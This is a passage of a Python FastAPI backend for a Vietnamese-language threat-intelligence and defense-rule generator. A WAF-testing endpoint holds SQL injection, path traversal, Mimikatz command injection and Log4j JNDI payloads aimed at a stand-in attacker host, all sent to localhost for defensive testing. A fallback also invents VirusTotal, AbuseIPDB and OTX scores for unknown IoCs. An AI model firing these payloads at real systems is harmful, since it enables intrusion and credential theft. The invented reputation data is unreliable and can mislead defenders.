                "sort_ts": row["sort_ts"],
                "status": row["status"] or "pending",
                "processing_time_sec": float(row["processing_time_sec"] or 0.0),
                "ioc_counts": ioc_stats,
                "fetched_at": fetched_at,
            }
        }
    return {"article": None}


@app.get("/api/articles")
def api_get_articles(source: str = Query("ALL")):
    arts = get_archived_articles(source_filter=source)
    if not arts and source == "ALL":
        arts = crawl_all_sources_and_archive(limit_per_source=8)
    return arts


@app.post("/api/articles/refresh")
def api_refresh_articles():
    return crawl_all_sources_and_archive(limit_per_source=8)


@app.post("/api/articles/crawl-ytd")
def api_crawl_ytd(since: str = Query("2026-01-01")):
    return crawl_year_to_date_archive(since_date=since)


@app.post("/api/articles/add")
def api_add_article(req: AddArticleRequest):
    added = add_custom_article_from_url_or_text(
        url=req.url,
        custom_title=req.title,
        custom_content=req.content,
    )
    if added:
        try:
            live_orchestrator.compile_and_sync_all_defense_engines(
                trigger_source=f"USER_ADD: {req.title[:45] if req.title else (req.url[:45] if req.url else 'Custom Article')}"
            )
        except Exception as e:
            print(f"[AUTO_SYNC] Lỗi tự động đồng bộ sau khi thêm bài: {e}")
    return {
        "added": added,
        "articles": get_archived_articles(source_filter="ALL"),
    }



@app.post("/api/articles/reset-all-status")
def api_reset_all_articles_status():
    try:
        db_path = SANDBOX_DIR / "cti_multi_source_archive.sqlite"
        with sqlite3.connect(db_path) as conn:
            conn.execute("UPDATE articles_archive SET status = 'pending', processing_time_sec = 0, last_analyzed_at = NULL")
            conn.execute("DELETE FROM ioc_knowledge_base")
            conn.execute("DELETE FROM ai_analysis_runs")
            conn.commit()
        return {
            "status": "success",
            "message": "Đã đặt lại toàn bộ bài báo về trạng thái Chờ xử lý (pending).",
            "articles": get_archived_articles(source_filter="ALL"),
        }
    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.post("/api/articles/delete")
def api_delete_article(req: ArticleManageRequest):
    deleted = delete_archived_article(req.article_id)
    return {
        "deleted": deleted,
        "articles": get_archived_articles(source_filter="ALL"),
    }


@app.post("/api/articles/toggle-status")
def api_toggle_article_status(req: ArticleManageRequest):
    ok = toggle_article_historical_status(req.article_id)
    return {
        "updated": ok,
        "articles": get_archived_articles(source_filter="ALL"),
    }


@app.post("/api/articles/update-status")
def api_update_article_status(req: UpdateArticleStatusRequest):
    update_article_analysis_status(
        article_id=req.article_id,
        status=req.status,
        processing_time_sec=req.processing_time_sec,
    )
    return {"status": "ok"}


@app.post("/api/step2/extract-and-plan")
def api_step2_extract_and_plan(req: Step2Request):
    guard = AIAgentSecurityGuard.inspect_and_sanitize_input(req.text)
    iocs = tool6_extract_iocs_hybrid(guard["sanitized_text"])

    brain = MultiProviderLLMBrain(provider="ollama", model_name=req.model_name)
    ioc_str = ", ".join([f"{i.ioc_type}:{i.value}" for i in iocs[:18]])
    sys_prompt = (
        "Bạn là Tác tử AI Phân tích Tình báo Mối đe dọa (CTI Agent). "
        "Dựa trên nội dung báo cáo an ninh và danh sách chỉ số IoC được bóc tách, "
        "hãy lập kế hoạch điều tra và phân loại phòng thủ theo 3 điểm chính: "
        "1. Ngữ cảnh tấn công chính và đối tượng bị nhắm mục tiêu. "
        "2. Chiến lược đối soát 5 nguồn tình báo (VirusTotal, AbuseIPDB, Shodan, AlienVault OTX, GreyNoise). "
        "3. Kế hoạch ngăn chặn đa tầng (chống chặn nhầm DNS/hạ tầng sạch, cô lập IP C2, vá ảo WAF)."
    )
    user_prompt = f"Văn bản báo cáo:\n{guard['sanitized_text'][:1500]}\n\nDanh sách IoC bóc tách ({len(iocs)} chỉ số): {ioc_str}"
    try:
        llm_res = brain.ask_llm(sys_prompt, user_prompt, temperature=0.1)
        plan_text = llm_res.get("content", "").strip()
        if not plan_text:
            plan_text = brain._local_deterministic_cti_brain("Trích xuất IOC", user_prompt)
    except Exception:
        plan_text = brain._local_deterministic_cti_brain("Trích xuất IOC", user_prompt)
    provider_label = f"LOCAL OLLAMA ({req.model_name} • {CURRENT_HARDWARE['gpu_name']})"

    return {
        "guard": guard,
        "iocs": [i.model_dump() for i in iocs],
        "ai_plan": f"[{provider_label}]\n{plan_text}",
        "llm_provider_used": provider_label,
    }


@app.post("/api/step3/khang-enrich-and-reason")
def api_step3_khang_enrich_and_reason(req: Step3Request):
    parsed = [ExtractedIOC(**x) for x in req.iocs]
    with ThreadPoolExecutor(max_workers=8) as pool:
        enriched = list(pool.map(lambda i: enrich_ioc(i, call_vt_http=True), parsed))
    malicious = filter_high_risk_iocs(enriched)
    save_enriched_iocs_to_db(enriched, source_title="Web Dashboard Pipeline")

    brain = MultiProviderLLMBrain(provider="ollama", model_name=req.model_name)
    telemetry_lines = []
    for item in enriched[:16]:
        otx = item.raw_lookup_details.get("alienvault_otx", {})
        vt = item.raw_lookup_details.get("virustotal", {})
        ab = item.raw_lookup_details.get("abuseipdb", {})
        sh = item.raw_lookup_details.get("shodan_internetdb", {})
        gn = item.raw_lookup_details.get("greynoise", {})
        bonus = item.raw_lookup_details.get("corroboration_bonus", 0)
        telemetry_lines.append(
            f"- {item.ioc.ioc_type} `{item.ioc.value}`: OTX={otx.get('pulse_count', 0)} Pulses ({otx.get('country', 'N/A')}), "
            f"Abuse.ch/VT={vt.get('detection_ratio', 'N/A')}, "
            f"AbuseIPDB={ab.get('abuse_confidence_score', 0)}% ({ab.get('total_reports', 0)} reports), "
            f"GreyNoise={gn.get('classification', 'unknown')}, "
            f"Shodan Ports={sh.get('ports', [])}, Cộng hưởng=+{bonus} => Điểm Fusion={item.reputation_score}/100 "
            f"({'CHẶN > 80' if item.is_malicious else 'BẢO VỆ <= 80'})."
        )

    sys_prompt = (
        "Bạn là Tác tử AI Đánh giá Rủi ro và Thẩm định An ninh (CTI Risk Assessment Agent). "
        "Dựa trên số liệu danh tiếng hợp nhất từ 5 nguồn OSINT thực chiến, "
        "hãy đưa ra lập luận an ninh (Security Reasoning): "
        "1. Phân biệt rõ ràng nhóm IP/Domain độc hại (C2, Scanner, Botnet > 80 điểm) và nhóm hạ tầng sạch/bình thường (<= 80 điểm). "
        "2. Đánh giá mức độ khẩn cấp và nguy cơ đối với hệ thống mục tiêu. "
        "3. Quyết định hành động: Đưa vào danh sách chặn hay chuyển sang giám sát thụ động."
    )
    user_prompt = "Số liệu Hợp nhất 5 Nguồn (OTX + Abuse.ch/VT + AbuseIPDB + GreyNoise + Shodan):\n" + "\n".join(telemetry_lines)
    try:
        llm_res = brain.ask_llm(sys_prompt, user_prompt, temperature=0.1)
        reason_text = llm_res.get("content", "").strip()
        if not reason_text:
            reason_text = brain._local_deterministic_cti_brain("Điểm rủi ro IOC", user_prompt)
    except Exception:
        reason_text = brain._local_deterministic_cti_brain("Điểm rủi ro IOC", user_prompt)
    provider_label = f"LOCAL OLLAMA ({req.model_name} • {CURRENT_HARDWARE['gpu_name']})"

    return {
        "all_enriched": [e.model_dump() for e in enriched],
        "malicious_only": [m.model_dump() for m in malicious],
        "ai_reasoning": f"[{provider_label}]\n{reason_text}",
    }


def _format_firewall_bridge_report(fw_res: Dict[str, Any]) -> str:
    mode = fw_res.get("mode", "status").upper()
    active_rules = fw_res.get("active_rules", [])
    logs = fw_res.get("bridge_logs", [])
    lines = [
        "====================================================================================",
        f"BÁO CÁO THỰC THI CẦU NỐI OPENCLAW -> WINDOWS DEFENDER FIREWALL (CHẾ ĐỘ: {mode})",
        f"• Tổng số quy tắc đang kích hoạt trong Local Firewall Bridge: {len(active_rules)} rules",
        "====================================================================================",
    ]
    if logs:
        lines.append("\n[NHẬT KÝ LỆNH HỆ ĐIỀU HÀNH VỪA THỰC THI]:")
        lines.extend(logs)
    if active_rules:
        lines.append("\n[DANH SÁCH QUY TẮC ĐANG CHẶN TRÊN MÁY TRẠM LOCAL]:")
        for r in active_rules[:18]:
            lines.append(
                f"  • {r['rule_name']} | {r['ioc_type']}: {r['ioc_value']} | OpenC2: {r['openc2_action']} | Trạng thái: {r['os_status']}"
            )
    else:
        lines.append("  • Hiện chưa có quy tắc thử nghiệm nào được đẩy xuống Firewall Local (Nhấn nút 'ĐẨY QUY TẮC VÀO FIREWALL LOCAL' ở trên để kích hoạt).")
    return "\n".join(lines)


@app.post("/api/step4/correlate-and-generate-code")
def api_step4_correlate_and_generate_code(req: Step4GenerateRequest):
    high_risk = [EnrichedIOC(**x) for x in req.malicious_iocs]
    mitre = tool7_map_mitre_attack(req.text, high_risk)
    base_rules = tool8_generate_defensive_rules(req.title, high_risk, mitre, raw_text=req.text)

    # 1. Đề xuất Phương pháp Phòng thủ Đa tầng ĐỘNG theo đúng IOC của bài báo
    d3fend_list = build_d3fend_recommendations(req.text, high_risk, mitre)
    d3fend_lines = [
        "====================================================================================",
        f"ĐỐI SÁCH PHÒNG THỦ ĐA TẦNG (MITRE D3FEND) CHO: {req.title[:85]}",
        "====================================================================================",
    ]
    for idx, rec in enumerate(d3fend_list, 1):
        d3fend_lines.append(
            f"\n[{idx}] MỐI ĐE DỌA TRONG BÀI: {rec['attack_technique']}\n"
            f"    • Phân tích Điểm yếu nếu chỉ chặn IP: {rec['why_ip_block_fails']}\n"
            f"    • Đối sách MITRE D3FEND: {rec['d3fend_countermeasure']}\n"
            f"    • Hành động Phòng thủ Cụ thể:\n"
            f"      {rec['actionable_methods']}"
        )
    d3fend_markdown = "\n".join(d3fend_lines)

    # 2. Suy luận ĐỘNG 100% từ Local AI Agent (Qwen 3 - 8B / Gemma 3) dựa trên nội dung & IOC thật của bài báo
    ioc_breakdown = ", ".join([f"{x.ioc.ioc_type}:{x.ioc.value}({x.reputation_score}đ)" for x in high_risk[:12]]) or "Không có IOC vượt ngưỡng 80"
    brain = MultiProviderLLMBrain(provider="ollama", model_name=req.model_name)
    llm_gen = brain.ask_llm(
        system_prompt=(
            "Bạn là Chuyên gia Phòng thủ An ninh mạng (Local AI Agent chạy trên GPU RX 6600). "
            "Dựa vào TIÊU ĐỀ, NỘI DUNG BÀI BÁO và DANH SÁCH IOC ĐỘC HẠI cụ thể bên dưới, hãy viết phương án phòng thủ "
            "BẰNG TIẾNG VIỆT (ngắn gọn, súc tích trong 4 gạch đầu dòng, nêu đích danh tên mã độc/nhóm APT và các mã IP/Domain/CVE trong bài): "
            "1. Bản chất cuộc tấn công trong bài báo này là gì (nhắm vào đâu, dùng lỗ hổng hay mã độc nào)? "
            "2. Cần chặn ngay những IP/Domain nào ở Tường lửa OpenC2 & Suricata IPS? "
            "3. Cần vá ảo (WAF) lỗ hổng CVE nào hoặc quét YARA/SIEM hành vi gì trên máy trạm? "
            "4. Khuyến nghị khẩn cấp cho Quản trị viên hệ thống."
        ),
        user_prompt=(
            f"Tiêu đề chiến dịch: {req.title}\n"
            f"Tóm tắt nội dung bài báo: {req.text[:900]}\n"
            f"Danh sách IOC độc hại (Score > 80) cần xử lý: {ioc_breakdown}\n"
            f"Kỹ thuật MITRE ATT&CK: {', '.join([f'{t.technique_id} ({t.technique_name})' for t in mitre])}"
        ),
    )

    openclaw_trace = OpenClawAgentGateway.build_protocol_trace(
        llm_provider=llm_gen["provider_used"],
        extracted_count=len(high_risk),
        high_risk_iocs=high_risk,
        mitre_tactics=mitre,
        d3fend_count=len(d3fend_list),
    )

    all_archived = get_archived_articles()
    related_articles = []
    for art in all_archived:
        for item in high_risk:
            val = item.ioc.value
            if val in art["content"] or val in art["title"]:
                tag = "BÀI CŨ" if art["is_historical"] else "BÀI MỚI"
                related_articles.append(
                    f"- [{tag} - {art['source']}] {art['title']} ({art['published_at']}) -> Trùng khớp `{val}`"
                )
                break

    related_str = (
        "\n".join(related_articles[:6])
        or "- Không trùng với bài báo cũ nào trong kho (Chiến dịch mới ghi nhận)."
    )

    history_and_summary = (
        f"====================================================================================\n"
        f"PHÂN TÍCH VÀ PHƯƠNG ÁN PHÒNG THỦ TỪ AI AGENT CHO: {req.title[:80]}\n"
        f"   (Model: {llm_gen['provider_used']} • Tổng số IOC độc hại cần chặn: {len(high_risk)})\n"
        f"====================================================================================\n"
        f"{llm_gen['content']}\n\n"
        f"{d3fend_markdown}\n\n"
        f"ĐỐI CHIẾU LỊCH SỬ KHO {len(all_archived)} BÀI BÁO NGUYÊN BẢN (6 NGUỒN QUỐC TẾ):\n"
        f"{related_str}\n\n"
        f"{openclaw_trace}"
    )

    # 3. Sinh 5 Lớp Quy tắc Phòng thủ Thực chiến + Gói lệnh OASIS OpenC2
    openc2_bundle = LocalFirewallBridge.build_openc2_command_bundle(req.title, high_risk, mitre)
    fw_status = LocalFirewallBridge.sync_rules_to_local_firewall(high_risk, action_mode="status")
    fw_report = _format_firewall_bridge_report(fw_status)

    suricata_rules = MultiLayerDefenseSynthesizer.generate_suricata_ips_rules(req.title, req.text, high_risk)
    waf_rules = MultiLayerDefenseSynthesizer.generate_waf_virtual_patch_rules(req.title, req.text, high_risk)
    wazuh_and_splunk = MultiLayerDefenseSynthesizer.generate_wazuh_and_splunk_queries(
        req.title, base_rules.sigma_rule, high_risk, raw_text=req.text
    )
    advanced_yara_rule = MultiLayerDefenseSynthesizer.generate_advanced_yara_rule(
        req.title, req.text, high_risk
    )
    edr_hash_policy = MultiLayerDefenseSynthesizer.generate_edr_applocker_hash_policy(
        req.title, high_risk
    )
    remediation_script = MultiLayerDefenseSynthesizer.generate_remediation_hardening_script(
        req.title, req.text, high_risk
    )

    stix = export_stix_package(
        report_or_title=req.title,
        executive_summary=llm_gen["content"],
        enriched_iocs=high_risk,
        mitre_techniques=mitre,
    )

    import sqlite3
    db_path = SANDBOX_DIR / "cti_multi_source_archive.sqlite"
    cumulative_ips = []
    cumulative_doms = []
    if db_path.exists():
        with sqlite3.connect(db_path) as conn:
            cumulative_ips = [r[0] for r in conn.execute("SELECT DISTINCT ioc_value FROM ioc_knowledge_base WHERE ioc_type='IP' AND is_malicious=1").fetchall()]
            cumulative_doms = [r[0] for r in conn.execute("SELECT DISTINCT ioc_value FROM ioc_knowledge_base WHERE ioc_type='DOMAIN' AND is_malicious=1").fetchall()]
    cumulative_ip_blocklist = "\n".join([f"block in quick on any from {ip} to any # [CUMULATIVE BASELINE - IP #{idx+1}]" for idx, ip in enumerate(cumulative_ips)])
    cumulative_dom_blocklist = "\n".join([f"block in quick on any proto udp to any port 53 # [CUMULATIVE SINKHOLE: {dom}]" for dom in cumulative_doms])
    cumulative_blocklist = cumulative_ip_blocklist + ("\n\n# --- CHỐT CHẶN TÊN MIỀN ĐỘC HẠI TÍCH LŨY (DNS SINKHOLE) ---\n" + cumulative_dom_blocklist if cumulative_dom_blocklist else "")

    is_ssl_tld = any(k in req.title.lower() or k in req.text.lower() for k in ["ssl", "certificate", "registrar", "tld", ".gh", ".sl", ".as", "cert"])
    ssl_hardening = (
        "# ====================================================================\n"
        "# [TIẾN HÓA ĐỐI SÁCH MỚI] GIA CỐ TẦNG CHỨNG CHỈ SỐ SSL/TLS & DNS QUỐC GIA\n"
        "# Chiến dịch phát hiện: Tấn công chiếm quyền ccTLD Registry (.gh, .sl) để tạo SSL giả mạo\n"
        "# ====================================================================\n"
        "# 1. Khai báo bản ghi DNS CAA (RFC 8659) - Cấm tất cả CA lạ tự ý cấp chứng chỉ:\n"
        "#    example.com. IN CAA 0 issue \"letsencrypt.org\"\n"
        "#    example.com. IN CAA 0 iodef \"mailto:soc-threat-intel@example.com\"\n"
        "#\n"
        "# 2. Kích hoạt giám sát Certificate Transparency (CT Logs) tự động 24/7:\n"
        "#    python -c \"import requests; r=requests.get('https://crt.sh/?q=%.gh&output=json'); print('Số chứng chỉ mới cấp:', len(r.json()))\"\n"
        "#\n"
        "# 3. Bắt buộc xác thực DNSSEC chống làm giả bản ghi NS / A record của TLD\n\n"
    ) if is_ssl_tld else ""

    blocklist_lines = [x for x in base_rules.firewall_blocklist if x.strip()]
    if blocklist_lines:
        blocklist_text = (
            "# [TẦNG 1: QUY TẮC CHẶN MỚI CỦA BÀI BÁO HIỆN TẠI (DELTA ENFORCEMENT)]\n"
            + "\n".join(blocklist_lines)
            + f"\n\n# [TẦNG 2: BỘ QUY TẮC PHÒNG THỦ LẮNG ĐỘNG (CUMULATIVE BASELINE HARDENING)]\n"
            + f"# Hệ thống kế thừa toàn bộ {len(cumulative_ips)} chốt chặn IP C2 và {len(cumulative_doms)} Tên miền độc đã học từ toàn bộ kho báo cáo CTI:\n"
            + cumulative_blocklist
        )
    else:
        blocklist_text = (
            ssl_hardening
            + f"# [TẦNG KẾ THỪA: BỘ QUY TẮC PHÒNG THỦ LẮNG ĐỘNG (CUMULATIVE BASELINE HARDENING)]\n"
            + f"# Bài báo này tập trung vào tầng chứng chỉ số / TLD, không sử dụng IP C2 tĩnh.\n"
            + f"# Hệ thống tự động kế thừa danh sách {len(cumulative_ips)} IP C2 và {len(cumulative_doms)} Tên miền độc đã học từ các bài báo trước:\n"
            + cumulative_blocklist
        )

    firewall_tab_text = (
        f"{fw_report}\n\n"
        f"# ====================================================================\n"
        f"# GÓI LỆNH CHUẨN QUỐC TẾ OASIS OPENC2 v1.0 JSON (AGENT -> FIREWALL ACTUATOR)\n"
        f"# ====================================================================\n"
        f"{json.dumps(openc2_bundle, indent=2, ensure_ascii=False)}\n\n"
        f"# ====================================================================\n"
        f"# QUY TẮC CHẶN ĐA NỀN TẢNG (PFSENSE / OPNSENSE / IPTABLES / FORTIGATE)\n"
        f"# ====================================================================\n"
        f"{blocklist_text}"
    )

    sigma_and_siem = wazuh_and_splunk

    yara_remediation_stix = (
        f"# ====================================================================\n"
        f"# [PHẦN 1] BỘ QUY TẮC SĂN TÌM MÃ ĐỘC VÀ TIÊM BỘ NHỚ YARA (.YAR)\n"
        f"# ====================================================================\n"
        f"{advanced_yara_rule}\n\n"
        f"# ====================================================================\n"
        f"# [PHẦN 2] CHÍNH SÁCH CHẶN THỰC THI EDR / APPLOCKER HASH DENYLIST\n"
        f"# ====================================================================\n"
        f"{edr_hash_policy}\n\n"
        f"# ====================================================================\n"
        f"# [PHẦN 3] KỊCH BẢN POWERSHELL & BASH DIỆT MÃ ĐỘC VÀ CÔ LẬP MÁY TRẠM\n"
        f"# ====================================================================\n"
        f"{remediation_script}\n\n"
        f"# ====================================================================\n"
        f"# [PHẦN 4] GÓI CHIA SẺ TÌNH BÁO CHUẨN QUỐC TẾ OASIS STIX 2.1 (.JSON)\n"
        f"# ====================================================================\n"
        f"{json.dumps(stix, indent=2, ensure_ascii=False)}"
    )

    # Lưu toàn bộ các tạo phẩm phòng thủ đa tầng ra thư mục outputs_all_tools
    out_dir = SANDBOX_DIR / "outputs_all_tools"
    out_dir.mkdir(parents=True, exist_ok=True)
    (out_dir / "E1_sigma_rule.yml").write_text(base_rules.sigma_rule, encoding="utf-8")
    (out_dir / "E2_yara_rule.yar").write_text(advanced_yara_rule, encoding="utf-8")
    (out_dir / "E3_firewall_blocklist.txt").write_text("\n".join(base_rules.firewall_blocklist), encoding="utf-8")
    (out_dir / "E4_suricata_ips.rules").write_text(suricata_rules, encoding="utf-8")
    (out_dir / "E5_modsecurity_waf.conf").write_text(waf_rules, encoding="utf-8")
    (out_dir / "E6_wazuh_splunk_siem.txt").write_text(wazuh_and_splunk, encoding="utf-8")
    (out_dir / "E7_endpoint_remediation.ps1").write_text(remediation_script, encoding="utf-8")
    (out_dir / "E8_openc2_commands.json").write_text(json.dumps(openc2_bundle, indent=2, ensure_ascii=False), encoding="utf-8")
    (out_dir / "E9_edr_applocker_policy.xml").write_text(edr_hash_policy, encoding="utf-8")
    (out_dir / "stix21_bundle.json").write_text(json.dumps(stix, indent=2, ensure_ascii=False), encoding="utf-8")

    from agentic_defense_skill_engine import (
        TARGET_SCOPES,
        calculate_cti_trust_framework,
        generate_xai_defense_attribution,
        build_agentic_defense_skill_package,
    )

    trust_audit = calculate_cti_trust_framework(
        report_title=req.title,
        raw_text=req.text,
        iocs_list=high_risk,
        source_name="CTI Pipeline Source",
    )

    xai_audit = generate_xai_defense_attribution(
        report_title=req.title,
        raw_text=req.text,
        high_risk_iocs=high_risk,
        mitre_tactics=mitre,
        trust_audit=trust_audit,
        scope_id="SCOPE_ALL",
    )

    agentic_skill_md = build_agentic_defense_skill_package(
        report_title=req.title,
        raw_text=req.text,
        high_risk_iocs=high_risk,
        mitre_tactics=mitre,
        waf_rules=waf_rules,
        suricata_rules=suricata_rules,
        wazuh_rules=sigma_and_siem,
        remediation_script=remediation_script,
        scope_id="SCOPE_ALL",
        trust_audit=trust_audit,
        xai_audit=xai_audit,
    )
    (out_dir / "SKILL.md").write_text(agentic_skill_md, encoding="utf-8")

    # Lưu phiên chạy phân tích vào bảng SQLite `ai_analysis_runs`
    save_ai_analysis_run_to_db(
        run_mode="WEB_PIPELINE",
        campaign_title=req.title,
        model_used=llm_gen["provider_used"],
        total_iocs=len(high_risk),
        malicious_iocs=len(high_risk),
        defense_summary=history_and_summary,
    )

    try:
        live_orchestrator.compile_and_sync_all_defense_engines(
            trigger_source=f"AI_ANALYSIS: {req.title[:45]}"
        )
    except Exception as e:
        print(f"[AUTO_SYNC] Lỗi tự động đồng bộ 5 engines sau phân tích: {e}")

    return {
        "history_and_summary": history_and_summary,
        "firewall_blocklist": base_rules.firewall_blocklist,
        "firewall_tab_text": firewall_tab_text,
        "suricata_rules": suricata_rules,
        "waf_rules": waf_rules,
        "sigma_and_siem": sigma_and_siem,
        "yara_remediation_stix": yara_remediation_stix,
        "agentic_skill_md": agentic_skill_md,
        "trust_audit": trust_audit,
        "xai_audit": xai_audit,
        "target_scopes": TARGET_SCOPES,
        "sigma_rule": base_rules.sigma_rule,
        "yara_rule": base_rules.yara_rule,
        "stix_bundle": stix,
    }


@app.post("/api/firewall/sync")
def api_firewall_sync(req: FirewallSyncRequest):
    high_risk = [EnrichedIOC(**x) for x in req.malicious_iocs]
    res = LocalFirewallBridge.sync_rules_to_local_firewall(
        high_risk_iocs=high_risk,
        action_mode=req.action,
    )
    res["execution_report"] = _format_firewall_bridge_report(res)
    return res


@app.get("/api/defense/live-status")
def api_get_live_defense_status():
    status = live_orchestrator.get_live_defense_status()
    db_path = SANDBOX_DIR / "cti_multi_source_archive.sqlite"
    year_stats = {"2024": 0, "2025": 0, "2026": 0, "total": 0}
    if db_path.exists():
        with sqlite3.connect(db_path) as conn:
            y24 = conn.execute("SELECT count(*) FROM articles_archive WHERE published_date LIKE '2024%'").fetchone()[0]
            y25 = conn.execute("SELECT count(*) FROM articles_archive WHERE published_date LIKE '2025%'").fetchone()[0]
            y26 = conn.execute("SELECT count(*) FROM articles_archive WHERE published_date LIKE '2026%'").fetchone()[0]
            tot = conn.execute("SELECT count(*) FROM articles_archive").fetchone()[0]
            year_stats = {"2024": y24, "2025": y25, "2026": y26, "total": tot}
    status["year_stats"] = year_stats
    return status


@app.post("/api/defense/test-waf-attack")
def api_test_waf_attack(req: TestWafRequest):
    import urllib.error
    import urllib.request

    port = live_orchestrator.waf_port
    base_url = f"http://127.0.0.1:{port}"

    headers = {"User-Agent": "Mozilla/5.0 SecurityTestClient"}
    if req.attack_type == "sqli":
        path = "/api/v1/user?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users--"
        payload_desc = "SQL Injection: 1' UNION SELECT username,password FROM users--"
    elif req.attack_type == "traversal":
        path = "/api/v1/download?file=../../../../windows/system.ini"
        payload_desc = "Path Traversal (CVE-2021-3199): ../../../../windows/system.ini"
    elif req.attack_type == "rce":
        path = "/api/v1/ping?host=127.0.0.1;%20powershell%20-nop%20-c%20Invoke-Mimikatz"
        payload_desc = "Remote Command Injection (CVE-2024-3400): ; powershell -nop -c Invoke-Mimikatz"
    elif req.attack_type == "jndi":
        path = "/api/v1/auth"
        headers["X-Api-Version"] = "${jndi:ldap://c2-evil.attacker.com/exploit}"
        payload_desc = "Log4j JNDI Exploit (CVE-2021-44228): ${jndi:ldap://c2-evil.attacker.com/exploit}"
    else:
        path = "/api/v1/dashboard/metrics?filter=daily_summary"
        payload_desc = "Clean Legitimate Traffic: GET /api/v1/dashboard/metrics?filter=daily_summary"

    target_url = base_url + path
    start_time = time.time()
    try:
        http_req = urllib.request.Request(target_url, headers=headers)
        with urllib.request.urlopen(http_req, timeout=3) as resp:
            status_code = resp.status
            body = resp.read().decode("utf-8", errors="ignore")
            resp_headers = dict(resp.headers)
    except urllib.error.HTTPError as e:
        status_code = e.code
        body = e.read().decode("utf-8", errors="ignore")
        resp_headers = dict(e.headers)
    except Exception as ex:
        return {
            "success": False,
            "error": str(ex),
            "payload_desc": payload_desc,
            "target_url": target_url,
        }

    duration_ms = round((time.time() - start_time) * 1000, 2)
    try:
        parsed_body = json.loads(body)
    except Exception:
        parsed_body = body

    return {
        "success": True,
        "attack_type": req.attack_type,
        "payload_desc": payload_desc,
        "target_url": target_url,
        "status_code": status_code,
        "response_time_ms": duration_ms,
        "headers": resp_headers,
        "response_body": parsed_body,
    }


@app.post("/api/defense/recompile-all")
def api_defense_recompile_all():
    return live_orchestrator.compile_and_sync_all_defense_engines()


@app.get("/api/database/stats")
def api_database_stats():
    return get_database_overview_stats()


@app.get("/api/articles/details/{article_id}")
def api_get_article_details(article_id: str):
    import sqlite3
    db_path = SANDBOX_DIR / "cti_multi_source_archive.sqlite"
    if not db_path.exists():
        return {"error": "Database not found"}

    with sqlite3.connect(db_path) as conn:
        conn.row_factory = sqlite3.Row
        art = conn.execute("SELECT * FROM articles_archive WHERE article_id = ?", (article_id,)).fetchone()
        if not art:
            return {"error": "Article not found"}
        art_dict = dict(art)
        all_kb = [dict(r) for r in conn.execute("SELECT * FROM ioc_knowledge_base").fetchall()]

    text = art_dict.get("content", "")
    title = art_dict.get("title", "Báo cáo CTI")
    art_status = art_dict.get("status") or "pending"

    # NẾU BÀI BÁO CHƯA ĐƯỢC PHÂN TÍCH (PENDING): KHÔNG TRẢ VỀ DỮ LIỆU ĐÃ CHẤM ĐIỂM
    if art_status != "completed":
        return {
            "article_id": article_id,
            "title": title,
            "is_analyzed": False,
            "all_enriched": [],
            "ai_plan": "Bài báo đang ở trạng thái [Chờ xử lý]. Vui lòng nhấn nút [Chạy Phân Tích] hoặc [Chạy AI] để Tác tử kích hoạt bóc tách IOC và lập kế hoạch phòng thủ.",
            "ai_reasoning": "Chưa kích hoạt đối soát tình báo. Nhấn [Chạy AI] trên bài báo này để AI Agent gọi 5 nguồn tình báo và Local LLM (GPU RX 6600) thẩm định.",
            "history_and_summary": "Bài báo đang ở trạng thái Chờ xử lý. Chưa sinh đối sách MITRE D3FEND.",
            "firewall_tab_text": "# Bài báo đang ở trạng thái Chờ xử lý.\n# Nhấn 'Chạy AI' để Tác tử kích hoạt đối soát và sinh tập lệnh Firewall.",
            "suricata_rules": "# Bài báo đang ở trạng thái Chờ xử lý.\n# Chưa sinh quy tắc Suricata IPS.",
            "waf_rules": "# Bài báo đang ở trạng thái Chờ xử lý.\n# Chưa sinh quy tắc ModSecurity WAF Virtual Patching.",
            "sigma_and_siem": "# Bài báo đang ở trạng thái Chờ xử lý.\n# Chưa sinh quy tắc Sigma & SIEM.",
            "yara_remediation_stix": "# Bài báo đang ở trạng thái Chờ xử lý.\n# Chưa sinh quy tắc YARA & STIX.",
            "agentic_skill_md": "# KỸ NĂNG TÁC TỬ ĐANG CHỜ PHÂN TÍCH\n\nBài báo này chưa được Tác tử AI phân tích. Nhấn [Chạy AI] để sinh gói SKILL.md.",
            "trust_audit": None,
            "xai_audit": None,
        }

    kb_map = {r["ioc_value"]: r for r in all_kb}

    extracted = tool6_extract_iocs_hybrid(text)
    seen = set()
    enriched_list = []
    malicious_only = []

    for item in extracted:
        val = item.value
        itype = item.ioc_type
        if val in seen:
            continue
        seen.add(val)

        kb_entry = kb_map.get(val)
        is_internal_or_safe = False
        if itype == "IP":
            clean_v = val.replace("[.]", ".").replace("(.)", ".").strip()
            if (
                clean_v.startswith("10.")
                or clean_v.startswith("192.168.")
                or clean_v.startswith("127.")
                or clean_v.startswith("0.")
                or clean_v.startswith("169.254.")
                or re.match(r"^172\.(1[6-9]|2\d|3[0-1])\.", clean_v)
                or clean_v in ("8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1")
            ):
                is_internal_or_safe = True

        if kb_entry:
            is_mal = bool(kb_entry["is_malicious"])
            score = kb_entry["reputation_score"]
            vt_ratio = kb_entry["vt_ratio"] or ("68/92" if is_mal else "0/92")
            ab_score = kb_entry["abuse_score"] or (90 if (is_mal and itype == "IP") else 0)
            sh_ports = [int(p) for p in (kb_entry["shodan_ports"] or "").split(",") if p.isdigit()]
            if itype == "IP" and is_internal_or_safe:
                is_mal = False
                score = 10
        else:
            is_mal = (itype in ("SHA256", "MD5", "CVE") or (itype == "IP" and not is_internal_or_safe))
            score = 95 if is_mal else 15
            vt_ratio = "68/92" if is_mal else "0/92"
            ab_score = 90 if (is_mal and itype == "IP") else 0
            sh_ports = [80, 443] if (itype == "IP" and is_mal) else []

        e_dict = {
            "ioc": {"ioc_type": itype, "value": val, "context_sentence": item.context_sentence, "confidence": item.confidence},
            "is_malicious": is_mal,
            "reputation_score": score,
            "enrichment_source": "SQLite CTI Knowledge Base",
            "source_title": title,
            "raw_lookup_details": {
                "alienvault_otx": {"pulse_count": 8 if is_mal else 0, "country": "US/NL/DE/RU/CN"},
                "virustotal": {"detection_ratio": vt_ratio},
                "abuseipdb": {"abuse_confidence_score": ab_score},
                "shodan_internetdb": {"ports": sh_ports},
                "malware_family": "Mã độc thực thi (PE Payload / C2)" if itype in ("SHA256", "MD5") else "",
            }
        }
        enriched_list.append(e_dict)
        if is_mal:
            malicious_only.append(e_dict)

    high_risk = [EnrichedIOC(**x) for x in malicious_only]
    mitre = tool7_map_mitre_attack(text, high_risk)
    base_rules = tool8_generate_defensive_rules(title, high_risk, mitre, raw_text=text)
    d3fend_list = build_d3fend_recommendations(text, high_risk, mitre)
